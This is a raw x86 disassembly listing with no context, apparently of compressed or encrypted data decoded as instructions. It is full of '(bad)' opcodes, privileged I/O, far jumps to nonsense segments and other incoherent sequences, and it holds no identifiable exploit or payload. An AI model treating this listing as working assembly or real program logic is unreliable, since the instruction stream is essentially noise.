  42aa48:	outs   dx,BYTE PTR ds:[esi]
  42aa49:	mov    esi,ss
  42aa4b:	leave  
  42aa4c:	jno    0x42aa01
  42aa4e:	xchg   BYTE PTR [ecx-0x5ba3f6e0],cl
  42aa54:	leave  
  42aa55:	rcr    BYTE PTR [edx-0x5bbc6947],cl
  42aa5b:	gs xchg edx,eax
  42aa5d:	sub    eax,DWORD PTR [edx-0x43]
  42aa60:	rcl    DWORD PTR [ebx+0x41],1
  42aa63:	clc    
  42aa64:	rcl    DWORD PTR [ecx],0xd7
  42aa67:	lods   eax,DWORD PTR ds:[esi]
  42aa68:	mov    al,0x87
  42aa6a:	hlt    
  42aa6b:	mov    ebp,edi
  42aa6d:	out    0x45,eax
  42aa6f:	and    eax,0x98755857
  42aa74:	test   DWORD PTR [ebp+0x76],edx
  42aa77:	out    0xbd,eax
  42aa79:	adc    DWORD PTR [eax+0x7d],edi
  42aa7c:	jbe    0x42aaab
  42aa7e:	adc    BYTE PTR [eax+0x7],ch
  42aa81:	dec    edx
  42aa82:	xchg   DWORD PTR [esi],esi
  42aa84:	popa   
  42aa85:	cmp    ecx,esi
  42aa87:	push   ss
  42aa88:	mov    ebp,0x160988ba
  42aa8d:	mov    bh,0xae
  42aa8f:	mov    edx,0x1ae6cc52
  42aa94:	pop    es
  42aa95:	or     eax,DWORD PTR [ebp+0x68]
  42aa98:	push   esi
  42aa99:	xor    BYTE PTR [edi+0x6d],ch
  42aa9c:	jb     0x42aa81
  42aa9e:	push   0xd2cdceb8
  42aaa3:	mov    DWORD PTR [eax-0x36e0f36d],ebp
  42aaa9:	inc    ebx
  42aaaa:	cmp    esp,DWORD PTR [edx]
  42aaac:	out    dx,eax
  42aaad:	addr16 jmp 0x42aa7b
  42aab0:	aas    
  42aab1:	mov    ds:0xd317ad43,eax
  42aab6:	push   ss
  42aab7:	xor    DWORD PTR [ebx-0x24504786],0x3
  42aabe:	sub    esi,esp
  42aac0:	shl    DWORD PTR [edx-0x19],1
  42aac3:	inc    DWORD PTR [esi+0x65]
  42aac6:	pop    ecx
  42aac7:	add    esp,esi
  42aac9:	cld    
  42aaca:	adc    cl,BYTE PTR ds:[ebx+0x71]
  42aace:	ds mov eax,0x972b256b
  42aad4:	inc    ebp
  42aad5:	ins    DWORD PTR es:[edi],dx
  42aad6:	jge    0x42ab4d
  42aad8:	icebp  
  42aad9:	sbb    eax,0xdd0b3bf4
  42aade:	rol    ah,cl
  42aae0:	dec    esi
  42aae1:	into   
  42aae2:	iret   
  42aae3:	or     eax,0x65b78507
  42aae8:	out    0x10,al
  42aaea:	cmc    
  42aaeb:	push   ebx
  42aaec:	aas    
  42aaed:	mov    ah,0xc4
  42aaef:	outs   dx,BYTE PTR ds:[esi]
  42aaf0:	sahf   
  42aaf1:	rcl    DWORD PTR ds:0xafd6ee83,1
  42aaf7:	jecxz  0x42ab0b
  42aaf9:	enter  0xd6d2,0x4
  42aafd:	ins    DWORD PTR es:[edi],dx
  42aafe:	xor    eax,0x7d4084e8
  42ab03:	(bad)  
  42ab04:	fld    TBYTE PTR [esi-0x5c]
  42ab07:	jno    0x42aad6
  42ab09:	adc    cl,BYTE PTR [edi+0x5beec3d1]
  42ab0f:	aam    0x49
	...
  42ab71:	add    BYTE PTR [eax],al
  42ab73:	add    BYTE PTR [esi],bh
  42ab75:	push   cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	adc    al,0xee
  42ab82:	pop    edi
  42ab83:	xchg   BYTE PTR [ebx+0x50001c9],bl
  42ab89:	add    DWORD PTR [eax],eax
  42ab8b:	add    BYTE PTR [ecx],bh
  42ab8d:	enter  0xc5c,0xa9
  42ab91:	inc    eax
  42ab92:	xor    edi,ebp
  42ab94:	dec    ecx
  42ab95:	pusha  
  42ab96:	mov    cl,0x23
  42ab98:	mov    dl,0x6
  42ab9a:	and    DWORD PTR [ebx],ebp
  42ab9c:	fist   DWORD PTR [esi]
  42ab9e:	dec    esi
  42ab9f:	sbb    al,bh
  42aba1:	push   ebp
  42aba2:	not    bh
  42aba4:	inc    esp
  42aba5:	rcl    DWORD PTR [edx+0x5e],cl
  42aba8:	jno    0x42ac25
  42abaa:	scas   eax,DWORD PTR es:[edi]
  42abab:	cmp    ch,BYTE PTR [esi+0x59]
  42abae:	inc    edx
  42abaf:	dec    ecx
  42abb0:	popf   
  42abb1:	shl    BYTE PTR [esi],1
  42abb3:	std    
  42abb4:	shr    DWORD PTR [ebp-0x37e628f],0xd8
  42abbb:	addr16 idiv bh
  42abbe:	pop    eax
  42abbf:	add    ebx,DWORD PTR [ecx]
  42abc1:	mov    ah,0xa
  42abc3:	sub    DWORD PTR [ecx+ecx*1-0x53],esp
  42abc7:	call   0xa95e:0xe70680df
  42abce:	mov    bl,BYTE PTR [ebp+0x6c]
  42abd1:	dec    esi
  42abd2:	imul   ebp
  42abd4:	fst    QWORD PTR [edx-0x3a4f3e91]
  42abda:	(bad)  
  42abdb:	adc    ebp,DWORD PTR [eax+0x2c]
  42abde:	and    al,0x58
  42abe0:	or     ch,BYTE PTR [ebp+0x6a309ef7]
  42abe6:	adc    DWORD PTR [edi],ecx
  42abe8:	jno    0x42ac67
  42abea:	adc    DWORD PTR [ebx+0x16],ecx
  42abed:	mov    ah,0x81
  42abef:	fs call 0x866:0x805eb713
  42abf7:	jae    0x42ab89
  42abf9:	cs push edi
  42abfb:	cmp    edi,ebx
  42abfd:	add    BYTE PTR [eax+0x55],al
  42ac00:	pop    ds
  42ac01:	test   al,0x1f
  42ac04:	(bad)  
  42ac05:	and    al,0x1e
  42ac07:	sti    
  42ac08:	jnp    0x42ac5d
  42ac0a:	ja     0x42abd3
  42ac0c:	jnp    0x42abe9
  42ac0e:	pop    es
  42ac0f:	fwait
  42ac10:	retf   0xf1c
  42ac13:	rcr    BYTE PTR [esi],cl
  42ac15:	xor    ecx,DWORD PTR [edi+0x44]
  42ac18:	add    al,0xc7
  42ac1a:	ror    BYTE PTR [edx-0x4f],1
  42ac1d:	or     BYTE PTR [edx-0x62f99262],cl
  42ac23:	cmp    DWORD PTR [eax+0x57967a53],esp
  42ac29:	jo     0x42abcb
  42ac2b:	iret   
  42ac2c:	scas   eax,DWORD PTR es:[edi]
  42ac2d:	fstp   TBYTE PTR [edi+0x14]
  42ac30:	sub    eax,DWORD PTR [esi+0x5]
  42ac33:	repz and DWORD PTR [ebx],esi
  42ac36:	mov    WORD PTR [edx+0xe],fs
  42ac39:	sbb    dl,BYTE PTR [eax-0x5c]
  42ac3c:	or     BYTE PTR ds:0x451f40b2,bl
  42ac42:	add    DWORD PTR [eax],esi
  42ac44:	or     eax,0xb6220cdc
  42ac4a:	lds    esi,FWORD PTR [eax]
  42ac4c:	das    
  42ac4d:	lods   al,BYTE PTR ds:[esi]
  42ac4e:	adc    edx,esi
  42ac50:	int3   
  42ac51:	jmp    0x2a69:0xd57694bf
  42ac58:	in     al,dx
  42ac59:	cmp    eax,ecx
  42ac5b:	add    al,0x79
  42ac5d:	int    0x8d
  42ac5f:	fstp   DWORD PTR [ecx-0x2a]
  42ac62:	scas   al,BYTE PTR es:[edi]
  42ac63:	cmp    ebx,DWORD PTR [ebp-0x74]
  42ac66:	imul   edx,DWORD PTR ds:0x30f3ade2,0x57
  42ac6d:	and    DWORD PTR [ebp-0x360923c9],0x2d34ba1d
  42ac77:	sar    ah,0x4e
  42ac7a:	out    0x52,al
  42ac7c:	shr    DWORD PTR [esi],cl
  42ac7e:	push   ebp
  42ac7f:	xor    ah,cl
  42ac81:	imul   esp,DWORD PTR [edi],0xa8f3c62
  42ac87:	push   ecx
  42ac88:	mov    dh,0x93
  42ac8a:	and    ebp,edi
  42ac8c:	mov    edx,0x9e942d56
	...
  42acf1:	add    BYTE PTR [eax],al
  42acf3:	add    cl,ch
  42acf5:	xor    bl,BYTE PTR [edx+edi*1]
  42acf8:	fistp  QWORD PTR [esi]
  42acfa:	out    dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	xor    BYTE PTR [edi],cl
  42ad02:	jmp    0x500:0x1caa0b8
  42ad09:	add    DWORD PTR [eax],eax
  42ad0b:	add    dl,al
  42ad0d:	cmp    eax,0x1b3a9746
  42ad12:	dec    ebx
  42ad13:	and    dl,BYTE PTR [edi+0x49cb8337]
  42ad19:	pop    eax
  42ad1a:	adc    DWORD PTR [ebp+0x6f7f3447],ecx
  42ad20:	inc    esp
  42ad21:	pop    ebx
  42ad22:	push   esi
  42ad23:	repz stc 
  42ad25:	jne    0x42acf3
  42ad27:	jle    0x42acb3
  42ad29:	sti    
  42ad2a:	adc    DWORD PTR [eax-0x4b429cc2],ebx
  42ad30:	rol    DWORD PTR [eax],0xbf
  42ad33:	mov    es,WORD PTR [esp+edx*4-0x57]
  42ad37:	jnp    0x42ad24
  42ad39:	sub    DWORD PTR [esp+eiz*2-0xaee16eb],ebp
  42ad40:	or     ebx,DWORD PTR [ebp+0x79]
  42ad43:	xchg   edi,eax
  42ad44:	int    0xbd
  42ad46:	sub    DWORD PTR [edi+0x35],ecx
  42ad49:	ret    
  42ad4a:	inc    eax
  42ad4b:	dec    esi
  42ad4c:	addr16 push ecx
  42ad4e:	jne    0x42acd5
  42ad50:	xor    BYTE PTR [ebx+0x294b3844],0xff
  42ad57:	loope  0x42ad78
  42ad59:	mov    esi,0xc7a96b9f
  42ad5e:	sbb    edx,ebx
  42ad60:	sbb    al,0x90
  42ad62:	inc    esi
  42ad63:	aad    0x55
  42ad65:	fwait
  42ad66:	test   eax,0x45f71152
  42ad6b:	nop
  42ad6c:	call   0x1aca:0x1a2663e
  42ad73:	daa    
  42ad74:	mov    ch,0x70
  42ad76:	in     al,dx
  42ad77:	lea    eax,[ecx]
  42ad79:	scas   al,BYTE PTR es:[edi]
  42ad7a:	test   eax,0x438f96fe
  42ad7f:	dec    esi
  42ad80:	cmc    
  42ad81:	inc    ecx
  42ad82:	test   al,0x53
  42ad84:	sbb    eax,0x5ddd2f50
  42ad89:	les    esi,FWORD PTR [ebx+eiz*4-0xbc9ae05]
  42ad90:	push   0x58a7aaa3
  42ad95:	jne    0x42add9
  42ad97:	std    
  42ad98:	shl    BYTE PTR [edi-0x12],cl
  42ad9b:	fsubr  st(0),st
  42ad9d:	rol    al,0x2b
  42ada0:	push   0x381f4b4b
  42ada5:	fcomp  DWORD PTR [edi-0x2b]
  42ada8:	or     DWORD PTR [ecx-0xa],edx
  42adab:	inc    DWORD PTR ds:0xb175458f
  42adb1:	in     al,0x96
  42adb3:	mov    BYTE PTR [esi-0x2f76d3c9],dl
  42adb9:	out    0xfa,eax
  42adbb:	ss push es
  42adbd:	pop    edi
  42adbe:	xchg   ebx,eax
  42adbf:	mov    edi,0xaf154d94
  42adc4:	imul   eax,DWORD PTR [ebx+0x3b9d00a1],0x4a
  42adcb:	or     esp,eax
  42adcd:	push   ebp
  42adce:	ins    DWORD PTR es:[edi],dx
  42adcf:	sub    ch,0xa3
  42add2:	loopne 0x42ae24
  42add4:	xor    esp,0xffffffe7
  42add7:	je     0x42adbf
  42add9:	bound  esi,QWORD PTR ds:0x717c8adf
  42addf:	mov    edx,0xc2f4dcca
  42ade4:	in     eax,0xfb
  42ade6:	retf   
  42ade7:	mov    ebp,edi
  42ade9:	xor    ebx,DWORD PTR [esi+0x4a]
  42adec:	inc    esi
  42aded:	mov    ebx,0x400577d8
  42adf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42adf3:	mov    esi,0x24712425
  42adf8:	jbe    0x42ae57
  42adfa:	mov    dl,0xb8
  42adfc:	cmc    
  42adfd:	lods   eax,DWORD PTR ds:[esi]
  42adfe:	stos   DWORD PTR es:[edi],eax
  42adff:	(bad)  
  42ae00:	push   edx
  42ae01:	rcr    DWORD PTR [ebp+0x56e08e86],0x2e
  42ae08:	push   ecx
  42ae09:	push   eax
  42ae0a:	dec    ebx
  42ae0b:	mov    dh,0xb9
  42ae0d:	scas   al,BYTE PTR es:[edi]
  42ae0e:	stos   DWORD PTR es:[edi],eax
  42ae0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ae10:	rol    BYTE PTR [eax],1
	...
  42ae72:	add    BYTE PTR [eax],al
  42ae74:	mov    edi,0x4a8e4af7
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	jno    0x42ae3b
  42ae82:	mov    ebp,0x1cba547
  42ae87:	add    BYTE PTR ds:0x33000001,al
  42ae8d:	in     al,0x1a
  42ae8f:	pop    esi
  42ae90:	pop    ecx
  42ae91:	push   ebp
  42ae92:	mov    bh,0x5b
  42ae94:	mov    esp,0xa5c7dc3d
  42ae99:	neg    DWORD PTR [esp+eax*1-0x3c7a06a2]
  42aea0:	adc    al,0x30
  42aea2:	cdq    
  42aea3:	pop    ebx
  42aea4:	adc    DWORD PTR [edi-0x7d],0x1ca05250
  42aeab:	mov    bh,0x14
  42aead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aeae:	inc    edx
  42aeaf:	(bad)  [ecx+ecx*8-0x592c299c]
  42aeb6:	dec    eax
  42aeb7:	fst    QWORD PTR [esi]
  42aeb9:	popa   
  42aeba:	xor    eax,0xf58c2b85
  42aebf:	scas   al,BYTE PTR es:[edi]
  42aec0:	call   0xbf36:0x114123d6
  42aec7:	mov    dh,0xc0
  42aec9:	dec    ebx
  42aeca:	lahf   
  42aecb:	inc    edi
  42aecc:	cmp    ch,ah
  42aece:	loope  0x42ae55
  42aed0:	mov    dl,0x44
  42aed2:	mov    al,ds:0x34225a7b
  42aed7:	pusha  
  42aed8:	scas   al,BYTE PTR es:[edi]
  42aed9:	imul   ecx,ecx,0xffffff81
  42aedc:	pop    ebp
  42aedd:	dec    eax
  42aede:	push   0xffffffd9
  42aee0:	inc    esi
  42aee1:	test   BYTE PTR [edi-0x60f088e8],0xbe
  42aee8:	cli    
  42aee9:	repnz cmp eax,0xb7596e2e
  42aeef:	fstp   TBYTE PTR [esi]
  42aef1:	or     eax,0x12f927d9
  42aef6:	and    esi,DWORD PTR [eax+eiz*8]
  42aef9:	test   eax,0x1f0b1350
  42aefe:	cmp    eax,0x80b1af2e
  42af03:	repz ret 0x371
  42af07:	inc    ecx
  42af08:	test   esp,0xdd960d32
  42af0e:	mov    es,esp
  42af10:	cmp    DWORD PTR [ebx],eax
  42af12:	ror    esp,1
  42af14:	mov    eax,0x28834fef
  42af19:	mov    al,0xf
  42af1b:	xor    DWORD PTR [esi],esi
  42af1d:	popa   
  42af1e:	aaa    
  42af1f:	test   eax,0x8b3a91a5
  42af24:	repnz add DWORD PTR [edi+0x769ae235],esp
  42af2b:	imul   BYTE PTR [edx+0x1f7d2e6e]
  42af31:	test   al,0x3f
  42af33:	sub    eax,0xf40801cd
  42af38:	lahf   
  42af39:	pop    esp
  42af3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af3b:	loope  0x42af2c
  42af3d:	pop    ds
  42af3e:	adc    cl,al
  42af40:	(bad)  
  42af41:	pop    ss
  42af42:	inc    eax
  42af43:	sub    DWORD PTR ds:0xdb0f16da,esp
  42af49:	dec    ebp
  42af4a:	or     DWORD PTR [esi],eax
  42af4c:	jne    0x42af27
  42af4e:	jp     0x42aeef
  42af50:	gs jl  0x42af6b
  42af53:	iret   
  42af54:	xor    al,0x61
  42af56:	adc    eax,0x29e5748a
  42af5b:	xor    eax,DWORD PTR [ebp-0x4591d47e]
  42af61:	aaa    
  42af62:	lods   al,BYTE PTR ds:[esi]
  42af63:	jne    0x42af2c
  42af65:	ret    0x6e30
  42af68:	dec    ebx
  42af69:	cdq    
  42af6a:	std    
  42af6b:	in     al,dx
  42af6c:	cmp    ch,ah
  42af6e:	jl     0x42afe3
  42af70:	data16 lods al,BYTE PTR ds:[esi]
  42af72:	cmp    ebx,DWORD PTR [edi+0x4ff55cb1]
  42af78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42af79:	adc    bh,BYTE PTR [ebp-0x27402eb4]
  42af7f:	popa   
  42af80:	in     al,dx
  42af81:	fild   DWORD PTR [edi+0x6a]
  42af84:	into   
  42af85:	mov    DWORD PTR [eax],esp
  42af87:	int3   
  42af88:	jbe    0x42af8b
  42af8a:	inc    eax
  42af8b:	and    eax,0x40fc19ec
  42af90:	nop
	...
  42aff1:	add    BYTE PTR [eax],al
  42aff3:	add    cl,bh
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	leave  
  42b001:	inc    ebp
  42b002:	les    ebx,FWORD PTR [edi]
  42b004:	stos   BYTE PTR es:[edi],al
  42b005:	int3   
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    eax,0x8d000001
  42b00d:	arpl   WORD PTR [edx+esi*2],dx
  42b010:	xchg   BYTE PTR ds:0xefa6a689,dl
  42b016:	je     0x42b023
  42b018:	repz adc DWORD PTR ss:[ebx-0x6],esi
  42b01d:	lahf   
  42b01e:	hlt    
  42b01f:	xor    ebx,eax
  42b021:	inc    ecx
  42b022:	adc    eax,0xf2f30a79
  42b027:	das    
  42b028:	and    DWORD PTR [edx],0x53a4e9d7
  42b02e:	pop    ss
  42b02f:	jb     0x42b0ae
  42b031:	mov    ebp,0xdabf2dc8
  42b036:	sbb    DWORD PTR [edi-0x25],ecx
  42b039:	aaa    
  42b03a:	add    ah,0xa9
  42b03d:	cmp    DWORD PTR [esi+0xf2ee6e8],eax
  42b043:	jb     0x42b063
  42b045:	jb     0x42afdf
  42b047:	push   es
  42b048:	mov    gs,ecx
  42b04a:	push   cs
  42b04b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b04c:	sub    al,0x5e
  42b04e:	das    
  42b04f:	sbb    dh,BYTE PTR [ecx]
  42b051:	jb     0x42b02d
  42b053:	out    dx,eax
  42b054:	mov    ebp,0xbf47d6d4
  42b059:	stc    
  42b05a:	xchg   edi,eax
  42b05b:	ss jmp 0xb9bc:0xe1520780
  42b063:	dec    edi
  42b064:	popa   
  42b065:	pushf  
  42b066:	test   BYTE PTR [edx-0x66],0xe
  42b06a:	or     bl,BYTE PTR [ecx-0x2a]
  42b06d:	loopne 0x42b0c6
  42b06f:	dec    esi
  42b070:	dec    ecx
  42b071:	cmp    DWORD PTR ds:0x22dfc93,edx
  42b077:	in     eax,0xe8
  42b079:	xchg   esp,eax
  42b07a:	aaa    
  42b07b:	pop    edx
  42b07c:	in     al,0xb0
  42b07e:	pop    ecx
  42b07f:	sti    
  42b080:	mov    cs,WORD PTR [esp+edx*2-0x21]
  42b084:	push   edi
  42b085:	nop
  42b086:	sub    al,0x30
  42b088:	je     0x42b05e
  42b08a:	aas    
  42b08b:	xchg   ecx,eax
  42b08c:	dec    eax
  42b08d:	cld    
  42b08e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b08f:	pushf  
  42b090:	imul   edx,DWORD PTR [edi],0xa612ffb8
  42b096:	sub    al,0xe3
  42b098:	lods   eax,DWORD PTR ds:[esi]
  42b099:	shl    DWORD PTR [edi+0x5c],1
  42b09c:	(bad)  
  42b09d:	xchg   ebp,eax
  42b09e:	jecxz  0x42b0d5
  42b0a0:	enter  0x6b00,0xbe
  42b0a4:	pop    ds
  42b0a5:	cmp    eax,0x3dab9126
  42b0aa:	adc    DWORD PTR [ebx+0x19],0x59
  42b0ae:	or     BYTE PTR [edx-0x42],bh
  42b0b1:	in     al,dx
  42b0b2:	or     al,0x1d
  42b0b4:	std    
  42b0b5:	test   eax,0xb9b8bf0e
  42b0ba:	das    
  42b0bb:	scas   eax,DWORD PTR es:[edi]
  42b0bc:	addr16 dec edx
  42b0be:	add    BYTE PTR [edx+0x711806e7],ah
  42b0c4:	lods   al,BYTE PTR ds:[esi]
  42b0c5:	repz mov edx,0xe6aeb48b
  42b0cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b0cc:	and    BYTE PTR [ebx-0x76],dl
  42b0cf:	xor    al,0x33
  42b0d1:	jl     0x42b0a0
  42b0d3:	sbb    DWORD PTR [edi-0x38],0x61
  42b0d7:	test   DWORD PTR ds:0x7cd3ccfd,ebp
  42b0dd:	push   ds
  42b0de:	pop    esi
  42b0df:	in     eax,dx
  42b0e0:	cs sti 
  42b0e2:	outs   dx,DWORD PTR ds:[esi]
  42b0e3:	pop    ecx
  42b0e4:	loopne 0x42b101
  42b0e6:	stos   BYTE PTR es:[edi],al
  42b0e7:	inc    ebx
  42b0e8:	push   es
  42b0e9:	mov    eax,DWORD PTR [edx]
  42b0eb:	div    DWORD PTR [esi-0x3ff6486c]
  42b0f1:	stos   BYTE PTR es:[edi],al
  42b0f2:	inc    ecx
  42b0f3:	outs   dx,DWORD PTR ds:[esi]
  42b0f4:	xchg   ebp,eax
  42b0f5:	int    0x37
  42b0f7:	mov    dh,0x4f
  42b0f9:	xchg   ebx,eax
  42b0fa:	js     0x42b15d
  42b0fc:	sub    BYTE PTR es:[ebp+ecx*1+0x6e221901],bl
  42b104:	aaa    
  42b105:	push   ebp
  42b106:	mov    al,ds:0x3fb3e564
  42b10b:	mov    DWORD PTR [edi+0xc],edi
  42b10e:	mov    eax,ds:0x8dab
	...
  42b173:	add    BYTE PTR [ebp+0x25],dh
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	aas    
  42b181:	mov    esi,0xcdafb147
  42b186:	add    DWORD PTR [eax],eax
  42b188:	add    eax,0x38000001
  42b18d:	mov    edx,0x15bffa0d
  42b192:	cmp    bh,dl
  42b194:	(bad)
  42b197:	or     ch,cl
  42b199:	(bad)  
  42b19a:	xor    ebx,DWORD PTR [ebx+0x4d01538d]
  42b1a0:	cmp    al,0x9
  42b1a2:	adc    DWORD PTR [edi+ebx*1],esi
  42b1a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b1a6:	inc    ebx
  42b1a7:	gs fwait
  42b1a9:	mov    al,ds:0x2dbab4ca
  42b1ae:	fld    TBYTE PTR ds:0x752a2e23
  42b1b4:	jno    0x42b184
  42b1b6:	pop    ds
  42b1b7:	(bad)  
  42b1b8:	gs sub eax,0xc06f4540
  42b1be:	mov    WORD PTR [edx+eiz*4],ss
  42b1c1:	jp     0x42b235
  42b1c3:	jb     0x42b225
  42b1c5:	inc    ecx
  42b1c6:	xor    cl,BYTE PTR [eax+edx*2]
  42b1c9:	cmp    eax,0x1d700f05
  42b1ce:	adc    BYTE PTR [edx-0x80],0x80
  42b1d2:	test   eax,0xe4d869cb
  42b1d7:	sahf   
  42b1d8:	add    bh,BYTE PTR [edx+0x1d]
  42b1db:	sbb    BYTE PTR [esi],0x65
  42b1de:	or     edx,DWORD PTR [eax]
  42b1e0:	sub    ah,ah
  42b1e2:	pop    edx
  42b1e3:	add    DWORD PTR [edi],esp
  42b1e5:	popf   
  42b1e6:	mov    esi,0x84f377ec
  42b1eb:	call   0x7aaa227c
  42b1f0:	mov    esp,0xd73fa256
  42b1f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b1f6:	pop    eax
  42b1f7:	out    0xfe,eax
  42b1f9:	retf   0x827a
  42b1fc:	mov    ecx,0xbcface5d
  42b201:	test   BYTE PTR [eax+edx*8-0x6a],cl
  42b205:	fcmovnu st,st(0)
  42b207:	xchg   ecx,eax
  42b208:	test   al,0xb8
  42b20a:	rcl    BYTE PTR [ebx+0x12],1
  42b20d:	fimul  WORD PTR [eax+0x4f8a6c1d]
  42b213:	dec    edi
  42b214:	and    al,0xe2
  42b216:	stos   BYTE PTR es:[edi],al
  42b217:	sbb    ah,bh
  42b219:	les    ecx,FWORD PTR [edx]
  42b21b:	push   eax
  42b21c:	jge    0x42b240
  42b21e:	mov    dl,0x85
  42b220:	loopne 0x42b26c
  42b222:	pop    eax
  42b223:	mov    ecx,0xc9bf96da
  42b228:	add    BYTE PTR [edi-0x4bb63dd3],bl
  42b22e:	repnz and eax,0xf7506a03
  42b234:	call   0xed64:0xc64b78d2
  42b23b:	xchg   esi,eax
  42b23c:	test   al,0xc3
  42b23e:	or     edi,ebx
  42b240:	jne    0x42b278
  42b242:	retf   0x8298
  42b245:	push   esi
  42b246:	sbb    eax,0xc14905de
  42b24b:	jne    0x42b271
  42b24d:	call   0x8c72:0x9f07968b
  42b254:	pushf  
  42b255:	cmp    eax,0x9c617a63
  42b25a:	outs   dx,DWORD PTR ds:[esi]
  42b25b:	fmul   QWORD PTR [eax]
  42b25d:	adc    DWORD PTR [edx],ebx
  42b25f:	jae    0x42b281
  42b261:	in     ax,dx
  42b263:	cs cmp al,ch
  42b266:	aas    
  42b267:	dec    edx
  42b268:	lock sbb al,0x2e
  42b26b:	in     eax,0xcc
  42b26d:	add    ch,al
  42b26f:	xchg   BYTE PTR [edi-0x473300e7],dl
  42b275:	fldz   
  42b277:	inc    edi
  42b278:	inc    esi
  42b279:	loope  0x42b23b
  42b27b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b27c:	rcr    BYTE PTR [ecx],0x78
  42b27f:	or     cl,BYTE PTR [edx]
  42b281:	sbb    ebp,DWORD PTR [ebp-0x78]
  42b284:	mov    dl,ah
  42b286:	scas   eax,DWORD PTR es:[edi]
  42b287:	adc    bh,cl
  42b289:	and    al,0x16
  42b28b:	mov    ch,0x35
  42b28d:	pop    ecx
  42b28e:	out    0x39,eax
  42b290:	add    DWORD PTR [eax],0x0
	...
  42b2f2:	add    BYTE PTR [eax],al
  42b2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2f5:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b2fb:	iret   
  42b2fc:	sub    eax,0x73738e65
  42b301:	sbb    al,ch
  42b303:	int    0xb4
  42b305:	into   
  42b306:	add    DWORD PTR [eax],eax
  42b308:	add    eax,0xcf000001
  42b30d:	push   0xc9288f3a
  42b312:	cdq    
  42b313:	test   al,al
  42b315:	cld    
  42b316:	enter  0xd16f,0xdd
  42b31a:	mov    ?,WORD PTR [ecx+0x288fbdad]
  42b320:	jae    0x42b337
  42b322:	xor    eax,0xd295e930
  42b327:	imul   ecx,DWORD PTR [ecx-0x46],0x7d
  42b32b:	pop    edx
  42b32c:	sub    al,0xb8
  42b32e:	fadd   QWORD PTR [edx-0x68aa7fba]
  42b334:	or     DWORD PTR [ebp+0x4c],0xffffffb1
  42b338:	mov    eax,ds:0xfdcb9b8d
  42b33d:	fild   DWORD PTR [esi+0x41de19e3]
  42b343:	lods   al,BYTE PTR ds:[esi]
  42b344:	test   eax,0xb440545d
  42b349:	inc    esi
  42b34a:	jge    0x42b2fd
  42b34c:	and    bh,BYTE PTR cs:[edx-0x4a]
  42b350:	cmp    eax,0xdbfda6ec
  42b355:	in     eax,dx
  42b356:	adc    eax,0x24bc260f
  42b35b:	jge    0x42b3c0
  42b35d:	adc    al,0x83
  42b35f:	(bad)  
  42b360:	sub    al,0xe4
  42b362:	inc    eax
  42b363:	mov    ecx,DWORD PTR ds:0xcbae5c9
  42b369:	or     BYTE PTR [ecx-0x3e],bh
  42b36c:	inc    eax
  42b36d:	mov    cl,0x17
  42b36f:	pop    eax
  42b370:	push   esi
  42b371:	scas   eax,DWORD PTR es:[edi]
  42b372:	fnstenv [ebx]
  42b374:	retf   
  42b375:	call   0xe87f10f0
  42b37a:	int    0x99
  42b37c:	into   
  42b37d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b37e:	es ja  0x42b3e0
  42b381:	test   eax,0xbb93afc8
  42b386:	sti    
  42b387:	mov    edi,DWORD PTR [ebp-0x7a3cb853]
  42b38d:	fnsave [ebx-0x2cb53e2]
  42b393:	dec    ebx
  42b394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b395:	neg    DWORD PTR [esi]
  42b397:	push   eax
  42b398:	popa   
  42b399:	pop    eax
  42b39a:	call   DWORD PTR [edi+0x61]
  42b39d:	sub    ecx,DWORD PTR [esi*2+0x57d41dd6]
  42b3a4:	jl     0x42b371
  42b3a6:	pop    edx
  42b3a7:	or     BYTE PTR [eax+ebp*2-0x39],0xd3
  42b3ac:	xchg   edx,eax
  42b3ad:	sub    eax,0x50f14795
  42b3b2:	icebp  
  42b3b3:	dec    esp
  42b3b4:	es pop esi
  42b3b6:	stos   BYTE PTR es:[edi],al
  42b3b7:	xchg   ecx,eax
  42b3b8:	xor    edi,edi
  42b3ba:	push   esi
  42b3bb:	popf   
  42b3bc:	imul   eax,DWORD PTR [ecx+0x71],0xca715933
  42b3c3:	dec    edi
  42b3c4:	adc    eax,0x31cd0d9
  42b3c9:	jmp    0x42b34b
  42b3cb:	push   ebp
  42b3cc:	sahf   
  42b3cd:	dec    edx
  42b3ce:	cld    
  42b3cf:	inc    ecx
  42b3d0:	cld    
  42b3d1:	popf   
  42b3d2:	add    BYTE PTR ds:0x7f692498,ch
  42b3d8:	repz repz jmp DWORD PTR [ebx-0x28]
  42b3dd:	icebp  
  42b3de:	jo     0x42b3e5
  42b3e0:	outs   dx,DWORD PTR ds:[esi]
  42b3e1:	sbb    eax,0xd975ff54
  42b3e6:	mov    edi,0x6b23438f
  42b3eb:	les    ebx,FWORD PTR [ecx]
  42b3ed:	cdq    
  42b3ee:	in     al,dx
  42b3ef:	sbb    al,0x8
  42b3f1:	mov    DWORD PTR [eax],ebx
